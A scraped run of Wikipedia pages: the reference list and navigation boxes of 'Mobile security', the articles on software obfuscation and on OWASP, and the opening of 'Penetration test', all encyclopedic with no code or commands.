^ Schmidt, Schmidt & Clausen 2008, p. 7-12. sfn error: no target: CITEREFSchmidtSchmidtClausen2008 (help)

^ Becher 2009, p. 126.

^ Malik 2016, p. 28.

^ Vaughan-Nichols, Steven J. "Google Tensor chip: Everything we know so far". ZDNet.

^ "The Titan M Chip Powers Up Pixel 3 Security". Wired.

^ Becher et al. 2011, p. 101.

^ a b Ruff 2011, p. 11.

^ a b Hogben & Dekker 2010, p. 45.

^ a b Becher 2009, p. 13.

^ Becher 2009, p. 34.

^ Ruff 2011, p. 7.

^ Mylonas, Alexios; Kastania, Anastasia; Gritzalis, Dimitris (2013). "Delegate the smartphone user? Security awareness in smartphone platforms". Computers & Security. 34: 47–66. CiteSeerX 10.1.1.717.4352. doi:10.1016/j.cose.2012.11.004.

^ Hogben & Dekker 2010, p. 46-48.

^ Ruff 2011, p. 7-8.

^ Shabtai et al. 2009, p. 8-9.

^ Hogben & Dekker 2010, p. 43.

^ Hogben & Dekker 2010, p. 47.

^ Hogben & Dekker 2010, p. 43-45.

^ Charlie Sorrel (2010-03-01). "TigerText Deletes Text Messages From Receiver's Phone". Wired. Archived from the original on 2010-08-26. Retrieved 2010-03-02.

^ Becher 2009, p. 40.

^ Gupta 2016, p. 461.


References[edit]
Books[edit]

Bishop, Matt (2004). Introduction to Computer Security. Addison Wesley Professional. ISBN 978-0-321-24744-5.
Dunham, Ken; Abu Nimeh, Saeed; Becher, Michael (2008). Mobile Malware Attack and Defense. Syngress Media. ISBN 978-1-59749-298-0.
Rogers, David (2013). Mobile Security: A Guide for Users. Copper Horse Solutions Limited. ISBN 978-1-291-53309-5.

Articles[edit]

Becher, Michael (2009). Security of Smartphones at the Dawn of Their Ubiquitousness (PDF) (Dissertation). Mannheim University.
Becher, Michael; Freiling, Felix C.; Hoffmann, Johannes; Holz, Thorsten; Uellenbeck, Sebastian; Wolf, Christopher (May 2011). Mobile Security Catching Up? Revealing the Nuts and Bolts of the Security of Mobile Devices (PDF). 2011 IEEE Symposium on Security and Privacy. pp. 96–111. doi:10.1109/SP.2011.29. ISBN 978-1-4577-0147-4.
Bilton, Nick (26 July 2010). "Hackers With Enigmatic Motives Vex Companies". The New York Times. p. 5.
Cai, Fangda; Chen, Hao; Wu, Yuanyi; Zhang, Yuan (2015). AppCracker: Widespread Vulnerabilities in Userand Session Authentication in Mobile Apps (PDF) (Dissertation). University of California, Davis.
Crussell, Johnathan; Gibler, Clint; Chen, Hao (2012). Attack of the Clones: Detecting Cloned Applications on Android Markets (PDF) (Dissertation). University of California, Davis.
Dagon, David; Martin, Tom; Starder, Thad (October–December 2004). "Mobile Phones as Computing Devices: The Viruses are Coming!". IEEE Pervasive Computing. 3 (4): 11. doi:10.1109/MPRV.2004.21. S2CID 14224399.
Dixon, Bryan; Mishra, Shivakant (June–July 2010). On and Rootkit and Malware Detection in Smartphones (PDF). 2010 International Conference on Dependable Systems and Networks Workshops (DSN-W). ISBN 978-1-4244-7728-9.
Gendrullis, Timo (November 2008). A real-world attack breaking A5/1 within hours. Proceedings of CHES '08. Springer. pp. 266–282. doi:10.1007/978-3-540-85053-3_17.
Gupta, Sugandha (2016). Vulnebdroid: Automated Vulnerability Score Calculator for Android Applications. International Symposium on Security in Computing and Communication. Springer. doi:10.1007/978-981-10-2738-3_40.
Guo, Chuanxiong; Wang, Helen; Zhu, Wenwu (November 2004). Smart-Phone Attacks and Defenses (PDF). ACM SIGCOMM HotNets. Association for Computing Machinery, Inc. Retrieved March 31, 2012.
Halbronn, Cedric; Sigwald, John (2010). Vulnerabilities & iPhone Security Model (PDF). HITB SecConf 2010. Archived from the original (PDF) on 2013-02-02. Retrieved 2012-04-21.
Hogben, Giles; Dekker, Marnix (December 2010). "Smartphones: Information security Risks, Opportunities and Recommendations for users". ENISA.
Jøsang, Audun; Miralabé, Laurent; Dallot, Léonard (2015). "Vulnerability by Design in Mobile Network Security" (PDF). Journal of Information Warfare (JIF). 14 (4). ISSN 1445-3347.
Malik, Jyoti (2016). CREDROID: Android malware detection by network traffic analysis. Proceedings of the 1st ACM Workshop on Privacy-Aware Mobile Computing. Association for Computing Machinery, Inc. pp. 28–36. doi:10.1145/2940343.2940348.
Mickens, James W.; Noble, Brian D. (2005). Modeling epidemic spreading in mobile environments. WiSe '05 Proceedings of the 4th ACM workshop on Wireless security. Association for Computing Machinery, Inc. pp. 77–86. doi:10.1145/1080793.1080806.
Mulliner, Collin Richard (2006). Security of Smart Phones (PDF) (M.Sc. thesis). University of California, Santa Barbara.
Pandya, Vaibhav Ranchhoddas (2008). Iphone Security Analysis (PDF) (Thesis). San Jose State University.
Raboin, Romain (December 2009). La sécurité des smartphones (PDF). Symposium sur la sécurité des technologies de l'information et des communications 2009. SSTIC09 (in French).
Racic, Radmilo; Ma, Denys; Chen, Hao (2006). Exploiting MMS Vulnerabilities to Stealthily Exhaust Mobile Phone's Battery (PDF) (Dissertation). University of California, Davis.
Roth, Volker; Polak, Wolfgang; Rieffel, Eleanor (2008). Simple and Effective Defense Against Evil Twin Access Points. ACM SIGCOMM HotNets. doi:10.1145/1352533.1352569. ISBN 978-1-59593-814-5.
Ruff, Nicolas (2011). Sécurité du système Android (PDF). Symposium sur la sécurité des technologies de l'information et des communications 2011. SSTIC11 (in French).
Ruggiero, Paul; Foote, Jon. Cyber Threats to Mobile Phones (PDF) (thesis). US-CERT.
Schmidt, Aubrey-Derrick; Schmidt, Hans-Gunther; Clausen, Jan; Yüksel, Kamer Ali; Kiraz, Osman; Camtepe, Ahmet; Albayrak, Sahin (October 2008). Enhancing Security of Linux-based Android Devices (PDF). Proceedings of 15th International Linux Kongress.
Schmidt, Aubrey-Derrick; Schmidt, Hans-Gunther; Batyuk, Leonid; Clausen, Jan Hendrik; Camtepe, Seyit Ahmet; Albayrak, Sahin (April 2009a). Smartphone Malware Evolution Revisited: Android Next Target? (PDF). 4th International Conference on Malicious and Unwanted Software (MALWARE). ISBN 978-1-4244-5786-1. Retrieved 2010-11-30.
Shabtai, Asaf; Fledel, Yuval; Kanonov, Uri; Elovici, Yuval; Dolev, Shlomi (2009). "Google Android: A State-of-the-Art Review of Security Mechanisms". arXiv:0912.5101v1 [cs.CR].
Thirumathyam, Rubathas; Derawi, Mohammad O. (2010). Biometric Template Data Protection in Mobile Device Using Environment XML-database. 2010 2nd International Workshop on Security and Communication Networks (IWSCN). ISBN 978-1-4244-6938-3. Archived from the original on 2013-02-12.
Töyssy, Sampo; Helenius, Marko (2006). "About malicious software in smartphones". Journal in Computer Virology. 2 (2): 109–119. doi:10.1007/s11416-006-0022-0. S2CID 9760466.
Websites[edit]
European Telecommunications Standards Institute (2011). "3GPP Confidentiality and Integrity Algorithms & UEA1 UIA1". Archived from the original on 12 May 2012.
Siemens (2010). "Series M Siemens SMS DoS Vulnerability".

Further reading[edit]

"Sécurisation de la mobilité" (PDF). CIGREF (in French). October 2010.
Chong, Wei Hoo (November 2007). iDEN Smartphone Embedded Software Testing (PDF). Fourth International Conference on Information Technology, 2007. ITNG '07. doi:10.1109/ITNG.2007.103. ISBN 978-0-7695-2776-5.
Jansen, Wayne; Scarfone, Karen (October 2008). "Guidelines on Cell Phone and PDA Security: Recommendations of the National Institute of Standards and Technology" (PDF). National Institute of Standards and Technology. doi:10.6028/NIST.SP.800-124. Retrieved April 21, 2012.
Murugiah P. Souppaya; Scarfone, Karen (June 21, 2013). "Guidelines for Managing the Security of Mobile Devices in the Enterprisewebsite=National Institute of Standards and Technology". doi:10.6028/NIST.SP.800-124r1. {{cite journal}}: Cite journal requires |journal= (help)
Lee, Sung-Min; Suh, Sang-bum; Jeong, Bokdeuk; Mo, Sangdok (January 2008). A Multi-Layer Mandatory Access Control Mechanism for Mobile Devices Based on Virtualization. 5th IEEE Consumer Communications and Networking Conference, 2008. CCNC 2008. doi:10.1109/ccnc08.2007.63. ISBN 978-1-4244-1456-7.
Li, Feng; Yang, Yinying; Wu, Jie (March 2010). CPMC: An Efficient Proximity Malware Coping Scheme in Smartphone-based Mobile Networks (PDF). INFOCOM, 2010 Proceedings IEEE. doi:10.1109/INFCOM.2010.5462113.
Ni, Xudong; Yang, Zhimin; Bai, Xiaole; Champion, Adam C.; Xuan, Dong (October 2009). Distribute: Differentiated User Access Control on Smartphones. 6th IEEE International Conference on Mobile Adhoc and Periodic Sensor Systems, 2009. MASS '09. ISBN 978-1-4244-5113-5.
Ongtang, Machigar; McLaughlin, Stephen; Enck, William; Mcdaniel, Patrick (December 2009). Semantically Rich Application-Centric Security in Android (PDF). Annual Computer Security Applications Conference, 2009. ACSAC '09. Annual Computer Security Applications Conference (Acsac). ISSN 1063-9527.
Schmidt, Aubrey-Derrick; Bye, Rainer; Schmidt, Hans-Gunther; Clausen, Jan; Kiraz, Osman; Yüksel, Kamer A.; Camtepe, Seyit A.; Albayrak, Sahin (2009b). Static Analysis of Executables for Collaborative Malware Detection on Android (PDF). IEEE International Conference Communications, 2009. ICC '09. Communications, 2009. Icc '09. IEEE International Conference on. ISSN 1938-1883.
Yang, Feng; Zhou, Xuehai; Jia, Gangyong; Zhang, Qiyuan (2010). A Non-cooperative Game Approach for Intrusion Detection Systems in Smartphone systems. 8th Annual Communication Networks and Services Research Conference. doi:10.1109/CNSR.2010.24. ISBN 978-1-4244-6248-3.

vteMobile phonesMobilenetworks,protocols
Channel capacity
Frequencies
Multi-band
Network operator
list
Roaming
Signal
SIM card
dual SIM
SIM lock
Standards comparison
Tethering
VoIP
WAP
XHTML-MP
Generations
Analogue:
0G
1G
Digital:
2G
3G
adoption
3.5G
4G
4.5G
5G
6G
Generaloperation
Features
GSM
services
History
Operating system
Security
phone cloning
Telephony
airplane mode
Text messaging
SMS
MMS
RCS
Spam
Tracking
Web browsing
Mobiledevices
Manufacturers
3D phone
Camera phone
Car phone
Feature phone
Projector phone
Satellite phone
Smartphone
Form factors
Bar
Flip
Phablet
Slider
Slate
Smartwatch
Fold
Smartphones
Android devices
rooting
BlackBerry 10
iPhone
iOS jailbreaking
Open-source mobile phones
Symbian devices
Windows Phone devices
MobilespecificsoftwareApps
Development
Distribution
Management
Cloud computing
Commerce
Banking
Marketing
advertising
campaigns
Payments
contactless
donating
Ticketing
Content
Blogging
Email
Gambling
Gaming
Health
Instant messaging
Learning
Music
News
Search
local
Social
address book
Television
Culture
Box breaking
Charms
Comics
Dating
Japanese culture
Novels
Ringtones
silent mode
Selfie
Txt-spk
Wallpaper
Environmentand health
BlackBerry thumb
Driving safety
Electronic waste
External power supply
Mental health from overuse
Phantom vibration syndrome
Radiation and health
Recycling
Law
Carrier IQ
Legality of recording by civilians
Mobile phones in prison
Photography and the law
Telephone tapping
Texting while driving
USA use restrictions while driving

 Telecommunication portal
 Telephones portal
 Category

vteMalware topicsInfectious malware
Comparison of computer viruses
Computer virus
Computer worm
List of computer worms
Timeline of computer viruses and worms
Concealment
Backdoor
Clickjacking
Man-in-the-browser
Man-in-the-middle
Rootkit
Trojan horse
Zombie computer
Malware for profit
Adware
Botnet
Crimeware
Fleeceware
Form grabbing
Fraudulent dialer
Malbot
Keystroke logging
Privacy-invasive software
Ransomware
Rogue security software
Scareware
Spyware
Web threats
By operating system
Android malware
Classic Mac OS viruses
iOS malware
Linux malware
MacOS malware
Macro virus
Mobile malware
Palm OS viruses
HyperCard viruses
Protection
Anti-keylogger
Antivirus software
Browser security
Data loss prevention software
Defensive computing
Firewall
Internet security
Intrusion detection system
Mobile security
Network security
Countermeasures
Computer and network surveillance
Honeypot
Operation: Bot Roast





Retrieved from "https://en.wikipedia.org/w/index.php?title=Mobile_security&oldid=1135770801"
Categories: Mobile securityHidden categories: Harv and Sfn no-target errorsArticles with short descriptionShort description is different from WikidataWikipedia articles needing copy edit from April 2022All articles needing copy editAll articles needing additional referencesArticles needing additional references from September 2022Articles needing additional references from November 2022All articles with unsourced statementsArticles with unsourced statements from February 2017Articles with unsourced statements from April 2012CS1 French-language sources (fr)CS1 errors: missing periodical
 



From Wikipedia, the free encyclopedia


For the term as used in natural language, see obfuscation.


Deliberate creation of difficult-to-understand code


Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
In software development, obfuscation is the act of creating source or machine code that is difficult for humans or computers to understand. Like obfuscation in natural language, it may use needlessly roundabout expressions to compose statements. Programmers may deliberately obfuscate code to conceal its purpose (security through obscurity) or its logic or implicit values embedded in it, primarily, in order to prevent tampering, deter reverse engineering, or even to create a puzzle or recreational challenge for someone reading the source code. This can be done manually or by using an automated tool, the latter being the preferred technique in industry.[1]


Overview[edit]
The architecture and characteristics of some languages may make them easier to obfuscate than others.[2][3] C,[4] C++,[5][6] and the Perl programming language[7] are some examples of languages easy to obfuscate. Haskell is also quite obfuscatable[8] despite being quite different in structure.
The properties that make a language obfuscatable are not immediately obvious.

Recreational obfuscation[edit]
Writing and reading obfuscated source code can be a brain teaser. A number of programming contests reward the most creatively obfuscated code, such as the International Obfuscated C Code Contest and the Obfuscated Perl Contest.
Types of obfuscations include simple keyword substitution, use or non-use of whitespace to create artistic effects, and self-generating or heavily compressed programs.
According to Nick Montfort, techniques may include: 

naming obfuscation, which includes naming variables in a meaningless or deceptive way;
data/code/comment confusion, which includes making some actual code look like comments or confusing syntax with data;
double coding, which can be displaying code in poetry form or interesting shapes.[9]
Short obfuscated Perl programs may be used in signatures of Perl programmers.  These are JAPHs ("Just another Perl hacker").[10]

Examples[edit]
Some Python examples can be found in the official Python programming FAQ and elsewhere.[11][12][13]
The movfuscator C compiler for the x86_32 ISA uses only the mov instruction in order to obfuscate [14][15]
Disadvantages of obfuscation[edit]
While obfuscation can make reading, writing, and reverse-engineering a program difficult and time-consuming, it will not necessarily make it impossible.[16]
It adds time and complexity to the build process for the developers.
It can make debugging issues after the software has been obfuscated extremely difficult.
Once code becomes abandonware and is no longer maintained, hobbyists may want to maintain the program, add mods, or understand it better. Obfuscation makes it hard for end users to do useful things with the code.
Certain kinds of obfuscation (i.e. code that isn't just a local binary and downloads mini binaries from a web server as needed) can degrade performance and/or require Internet.
Decompilers[edit]
A decompiler can reverse-engineer source code from an executable or library. Decompilation is sometimes called a man-at-the-end attack, based on the traditional cryptographic attack known as "man-in-the-middle". It puts source code in the hands of the user, although this source code is often difficult to read. The source code is likely to have random function and variable names, incorrect variable types, and use different logic than the original source code (due to compiler optimizations).

Cryptographic obfuscation[edit]
Cryptographers have explored the idea of obfuscating code so that reverse-engineering the code is cryptographically hard. This is formalized in the many proposals for indistinguishability obfuscation, a cryptographic primitive that, if possible to build securely, would allow one to construct many other kinds of cryptography, including completely novel types that no one knows how to make. (A stronger notion, black-box obfuscation, was shown impossible in 2001 when researchers constructed programs that cannot be obfuscated in this notion.)[17][18]

Notifying users of obfuscated code[edit]
Some anti-virus softwares, such as AVG AntiVirus,[19] will also alert their users when they land on a website with code that is manually obfuscated, as one of the purposes of obfuscation can be to hide malicious code. However, some developers may employ code obfuscation for the purpose of reducing file size or increasing security. The average user may not expect their antivirus software to provide alerts about an otherwise harmless piece of code, especially from trusted corporations, so such a feature may actually deter users from using legitimate software.
Mozilla and Google disallow browser extensions containing obfuscated code in their add-ons store.[20][21]

Obfuscating software[edit]
A variety of tools exist to perform or assist with code obfuscation. These include experimental research tools created by academics, hobbyist tools, commercial products written by professionals, and open-source software. Deobfuscation tools also exist that attempt to perform the reverse transformation.
Although the majority of commercial obfuscation solutions work by transforming either program source code, or platform-independent bytecode as used by Java and .NET, there are also some that work directly on compiled binaries.

Obfuscation and copyleft licenses[edit]
There has been debate on whether it is illegal to skirt copyleft software licenses by releasing source code in obfuscated form, such as in cases in which the author is less willing to make the source code available. The issue is addressed in the GNU General Public License by requiring the "preferred form for making modifications" to be made available.[22] The GNU website states "Obfuscated 'source code' is not real source code and does not count as source code."[23]

See also[edit]

AARD code
Spaghetti code
Write-only language
Decompilation
Esoteric programming language
Quine
Overlapping instructions
Polymorphic code
Hardware obfuscation
Underhanded C Contest
Source-to-source compiler
ProGuard (Java Obfuscator)
Dotfuscator (.Net Obfuscator)
Digital rights management
Indistinguishability obfuscation
Source code beautification

References[edit]


^ "What is obfuscation (obfu)? - Definition from WhatIs.com". SearchSoftwareQuality. Retrieved February 1, 2019.

^ Binstock, Andrew (March 6, 2003). "Obfuscation: Cloaking your Code from Prying Eyes". Archived from the original on April 20, 2008. Retrieved November 25, 2013.

^ Atwood, Jeff (May 15, 2005). "Jeff Atwood, May 15, 2005". Codinghorror.com. Retrieved November 25, 2013.

^ "Obfuscation". Kenter.demon.nl. Archived from the original on March 4, 2016. Retrieved November 25, 2013.

^ "C++ Tutorials – Obfuscated Code – A Simple Introduction". DreamInCode.net. Retrieved November 25, 2013.

^ "C Tutorials – Obfuscated Code in C". July 7, 2011. Retrieved November 25, 2013.

^ As of 2013-11-25 18:22 GMT. "Pe(a)rls in line noise". Perlmonks.org. Retrieved November 25, 2013.

^ "Obfuscation – Haskell Wiki". February 16, 2006. Archived from the original on August 30, 2017. Retrieved March 3, 2020.

^ Montfort, Nick. "Obfuscated code" (PDF). Archived from the original (PDF) on April 24, 2019. Retrieved November 24, 2017.

^ "JAPH – Just Another Perl Hacker". pm.org. Perl Mongers. Archived from the original on May 16, 2013. Retrieved February 27, 2015.

^ Ben Kurtovic. "Obfuscating "Hello world!"". benkurtovic.com.

^ "Obfuscated Python". wiki.c2.com.

^ "The First Annual Obfuscated Python Content". code.activestate.com.

^ domas (November 3, 2022), xoreaxeaxeax/movfuscator, retrieved November 5, 2022

^ Break Me00 The MoVfuscator Turning mov into a soul crushing RE nightmare Christopher Domas, retrieved November 5, 2022

^ ""Can We Obfuscate Programs?" by Boaz Barak". Math.ias.edu. Archived from the original on March 23, 2016. Retrieved November 25, 2013.

^ "Cryptography Breakthrough Could Make Software Unhackable". Wired. ISSN 1059-1028. Retrieved March 14, 2021.

^ Jain, Aayush; Lin, Huijia; Sahai, Amit (2020). "Indistinguishability Obfuscation from Well-Founded Assumptions". Cryptology ePrint Archive. arXiv:2008.09317.

^ "Blocking website and only way to fix is disabling HTTPS s... | AVG". support.avg.com. July 21, 2020. Retrieved February 4, 2022.

^ at 05:01, Thomas Claburn in San Francisco 2 Oct 2018. "Google taking action against disguised code in Chrome Web Store". www.theregister.co.uk. Retrieved November 12, 2019.

^ Cimpanu, Catalin. "Mozilla announces ban on Firefox extensions containing obfuscated code". ZDNet. Retrieved November 12, 2019.

^ "Reasoning behind the "preferred form of the work for making modifications to it" language in the GPL". Lwn.net. Retrieved November 25, 2013.

^ "What is free software?". gnu.org. Retrieved December 18, 2014.


Further reading[edit]

Seyyedhamzeh, Javad, ABCME: A Novel Metamorphic Engine, 17th National Computer Conference, Sharif University of Technology, Tehran, Iran, 2012.
B. Barak, O. Goldreich, R. Impagliazzo, S. Rudich, A. Sahai, S. Vadhan and K. Yang. "On the (Im)possibility of Obfuscating Programs". 21st Annual International Cryptology Conference, Santa Barbara, California, USA. Springer Verlag LNCS Volume 2139, 2001.
Mateas, Michael; Nick Montfort. "A Box, Darkly: Obfuscation, Weird Languages, and Code Aesthetics" (PDF). Proceedings of the 6th Digital Arts and Culture Conference, IT University of Copenhagen, 1–3 December 2005. pp. 144–153.

External links[edit]
The International Obfuscated C Code Contest
Protecting Java Code Via Code Obfuscation, ACM Crossroads, Spring 1998 issue
Can we obfuscate programs?
Yury Lifshits. Lecture Notes on Program Obfuscation (Spring'2005)
Java obfuscators at Curlie
c2:BlackBoxComputation




Retrieved from "https://en.wikipedia.org/w/index.php?title=Obfuscation_(software)&oldid=1132832828"
Categories: Software obfuscationAnti-patternsObfuscationSource codeProgram transformationHidden categories: Use American English from March 2019All Wikipedia articles written in American EnglishArticles with short descriptionShort description is different from WikidataUse mdy dates from March 2019Articles with Curlie linksArticles with example C code
 



From Wikipedia, the free encyclopedia


Computer security organization
 A major contributor to this article appears to have a close connection with its subject. It may require cleanup to comply with Wikipedia's content policies, particularly neutral point of view. Please discuss further on the talk page. (December 2022) (Learn how and when to remove this template message)
OWASPFounded2001[1]FounderMark Curphey[1]Type501(c)(3) Nonprofit organizationFocusWeb Security, Application Security, Vulnerability AssessmentMethodIndustry standards, Conferences, WorkshopsBoard of directorsVandana Verma, Chair; Grant Ongers, Vice-Chair; Glenn ten Cate, Treasurer; Avi Douglen, Secretary; Martin Knobloch, Bil Corry, Joubin Jabbari[2]Key peopleAndrew van der Stock, Executive Director; Kelly Santalucia, Director of Events and Corporate Support; Harold Blankenship, Director Projects and Technology; Dawn Aitken, Operations Manager; Lisa Jones, Chapter and Membership Manager; Lauren Thomas, Event Coordinator[3]Revenue (2017)  $2.3 million[4]Employees  0 (2020)[5]Volunteers  approx. 13,000 (2017)[6]Websiteowasp.org

The Open Web Application Security Project (OWASP) is an online community that produces freely-available articles, methodologies, documentation, tools, and technologies in the field of web application security.[7][8] The OWASP provides free and open resources. It is led by a non-profit called The OWASP Foundation. The OWASP Top 10 - 2021 is the published result of recent research based on comprehensive data compiled from over 40 partner organizations.


History[edit]
Mark Curphey started OWASP on September 9, 2001.[1] Jeff Williams served as the volunteer Chair of OWASP from late 2003 until September 2011. As of 2015[update], Matt Konda chaired the Board.[9]
The OWASP Foundation, a 501(c)(3) non-profit organization in the US established in 2004, supports the OWASP infrastructure and projects. Since 2011, OWASP is also registered as a non-profit organization in Belgium under the name of OWASP Europe VZW.[10]

Publications and resources[edit]
OWASP Top Ten: The "Top Ten", first published in 2003, is regularly updated.[11] It aims to raise awareness about application security by identifying some of the most critical risks facing organizations.[12][13][14] Many standards, books, tools, and many organizations reference the Top 10 project, including MITRE, PCI DSS,[15] the Defense Information Systems Agency (DISA-STIG), and the United States Federal Trade Commission (FTC),[16]
OWASP Software Assurance Maturity Model: The Software Assurance Maturity Model (SAMM) project's mission is to provide an effective and measurable way for all types of organizations to analyze and improve their software security posture. A core objective is to raise awareness and educate organizations on how to design, develop, and deploy secure software through a flexible self-assessment model. SAMM supports the complete software lifecycle and is technology and process agnostic. The SAMM model is designed to be evolutive and risk-driven in nature, acknowledging there is no single recipe that works for all organizations.[17]
OWASP Development Guide: The Development Guide provides practical guidance and includes J2EE, ASP.NET, and PHP code samples. The Development Guide covers an extensive array of application-level security issues, from  SQL injection through modern concerns such as phishing, credit card handling, session fixation, cross-site request forgeries, compliance, and privacy issues.
OWASP Testing Guide: The OWASP Testing Guide includes a "best practice" penetration testing framework that users can implement in their own organizations and a "low level" penetration testing guide that describes techniques for testing most common web application and web service security issues. Version 4 was published in September 2014, with input from 60 individuals.[18]
OWASP Code Review Guide: The code review guide is currently at release version 2.0, released in July 2017.
OWASP Application Security Verification Standard (ASVS): A standard for performing application-level security verifications.[19]
OWASP XML Security Gateway (XSG) Evaluation Criteria Project.[20]
OWASP Top 10 Incident Response Guidance. This project provides a proactive approach to Incident Response planning. The intended audience of this document includes business owners to security engineers, developers, audit, program managers, law enforcement & legal council.[21]
OWASP ZAP Project: The Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications. It is designed to be used by people with a wide range of security experience including developers and functional testers who are new to penetration testing.
Webgoat: a deliberately insecure web application created by OWASP as a guide for secure programming practices.[1] Once downloaded, the application comes with a tutorial and a set of different lessons that instruct students how to exploit vulnerabilities with the intention of teaching them how to write code securely.
OWASP AppSec Pipeline: The Application Security (AppSec) Rugged DevOps Pipeline Project is a place to find information needed to increase the speed and automation of an application security program. AppSec Pipelines take the principles of DevOps and Lean and applies that to an application security program.[22]
OWASP Automated Threats to Web Applications: Published July 2015[23] - the OWASP Automated Threats to Web Applications Project aims to provide definitive information and other resources for architects, developers, testers and others to help defend against automated threats such as credential stuffing. The project outlines the top 20 automated threats as defined by OWASP.[24]
OWASP API Security Project: focuses on strategies and solutions to understand and mitigate the unique vulnerabilities and security risks of Application Programming Interfaces (APIs). Includes the most recent list API Security Top 10 2019.[25]
Awards[edit]
The OWASP organization received the 2014 Haymarket Media Group SC Magazine Editor's Choice award.[8][26]

See also[edit]
Open Source Security Foundation
References[edit]


^ a b c d Huseby, Sverre (2004). Innocent Code: A Security Wake-Up Call for Web Programmers. Wiley. p. 203. ISBN 0470857447.

^ "OWASP Foundation Global Board". OWASP. May 3, 2022. Retrieved May 3, 2022.

^ "OWASP Foundation Staff". OWASP. January 21, 2022. Retrieved May 3, 2022.

^ "OWASP FOUNDATION INC". Nonprofit Explorer. ProPublica. May 9, 2013. Retrieved January 8, 2020.

^ [hhttps://projects.propublica.org/nonprofits/organizations/200963503/202103029349301825/full "OWASP Foundation's Form 990 for fiscal year ending Dec. 2020"]. October 29, 2021. Retrieved January 18, 2023 – via ProPublica Nonprofit Explorer.

^ "OWASP Foundation's Form 990 for fiscal year ending Dec. 2017". October 26, 2018. Retrieved January 8, 2020 – via ProPublica Nonprofit Explorer.

^ "OWASP top 10 vulnerabilities". developerWorks. IBM. April 20, 2015. Retrieved November 28, 2015.

^ a b "SC Magazine Awards 2014" (PDF). Media.scmagazine.com. Archived from the original (PDF) on September 22, 2014. Retrieved November 3, 2014.

^ Board Archived September 16, 2017, at the Wayback Machine. OWASP. Retrieved on 2015-02-27.

^ OWASP Europe, OWASP, 2016

^ OWASP Top Ten Project on owasp.org

^ Trevathan, Matt (October 1, 2015). "Seven Best Practices for Internet of Things". Database and Network Journal. Archived from the original on November 28, 2015.

^ Crosman, Penny (July 24, 2015). "Leaky Bank Websites Let Clickjacking, Other Threats Seep In". American Banker. Archived from the original on November 28, 2015.

^ Pauli, Darren (December 4, 2015). "Infosec bods rate app languages; find Java 'king', put PHP in bin". The Register. Retrieved December 4, 2015.

^ "Payment Card Industry (PCI) Data Security Standard" (PDF). PCI Security Standards Council. November 2013. p. 55. Retrieved December 3, 2015.

^ 
"Open Web Application Security Project Top 10 (OWASP Top 10)". Knowledge Database. Synopsys. Synopsys, Inc. 2017. Retrieved July 20, 2017. Many entities including the PCI Security Standards Council, National Institute of Standards and Technology (NIST), and the Federal Trade Commission (FTC) regularly reference the OWASP Top 10 as an integral guide for mitigating Web application vulnerabilities and meeting compliance initiatives.

^ "What is OWASP SAMM?". OWASP SAMM. Retrieved November 6, 2022.{{cite web}}:  CS1 maint: url-status (link)

^ Pauli, Darren (September 18, 2014). "Comprehensive guide to obliterating web apps published". The Register. Retrieved November 28, 2015.

^ Baar, Hans; Smulters, Andre; Hintzbergen, Juls; Hintzbergen, Kees (2015). Foundations of Information Security Based on ISO27001 and ISO27002 (3 ed.). Van Haren. p. 144. ISBN 9789401800129.

^ "Category:OWASP XML Security Gateway Evaluation Criteria Project Latest". Owasp.org. Archived from the original on November 3, 2014. Retrieved November 3, 2014.

^ "OWASP Incident Response Project - OWASP". Archived from the original on April 6, 2019. Retrieved December 12, 2015.

^ "OWASP AppSec Pipeline". Open Web Application Security Project (OWASP). Retrieved February 26, 2017.

^ "AUTOMATED THREATS to Web applications" (PDF). OWASP. July 2015.

^ 
The list of automated threat events

^ "OWASP API Security Project - API Security Top 10 2019". OWASP.{{cite web}}:  CS1 maint: url-status (link)

^ 
"Winners | SC Magazine Awards". Awards.scmagazine.com. Archived from the original on August 20, 2014. Retrieved July 17, 2014. Editor's Choice [...] Winner: OWASP Foundation


External links[edit]
Official website
Authority control General
VIAF
1
WorldCat
National libraries
Germany
United States





Retrieved from "https://en.wikipedia.org/w/index.php?title=OWASP&oldid=1134544951"
Categories: Web security exploitsComputer security organizationsComputer standards501(c)(3) organizationsNon-profit organisations based in BelgiumOrganizations established in 20012001 establishments in BelgiumHidden categories: Webarchive template wayback linksCS1 maint: url-statusArticles with short descriptionShort description matches WikidataWikipedia articles with possible conflicts of interest from December 2022Use mdy dates from August 2012Articles containing potentially dated statements from 2015All articles containing potentially dated statementsOfficial website different in Wikidata and WikipediaArticles with VIAF identifiersArticles with WorldCat identifiersArticles with GND identifiersArticles with LCCN identifiers
 



From Wikipedia, the free encyclopedia


Method of evaluating computer and network security by simulating a cyber attack
This article is about testing of computer systems. For testing of geotechnical properties of soil, see Standard penetration test.
This article's lead section may be too long for the length of the article. Please help by moving some material from it into the body of the article. Please read the layout guide and lead section guidelines to ensure the section will still be inclusive of all essential details. Please discuss this issue on the article's talk page. (December 2021)

A penetration test, colloquially known as a pentest or ethical hacking, is an authorized simulated cyberattack on a computer system, performed to evaluate the security of the system;[1][2] this is not to be confused with a vulnerability assessment.[3] The test is performed to identify weaknesses (also referred to as vulnerabilities), including the potential for unauthorized parties to gain access to the system's features and data,[4][5] as well as strengths,[6] enabling a full risk assessment to be completed.
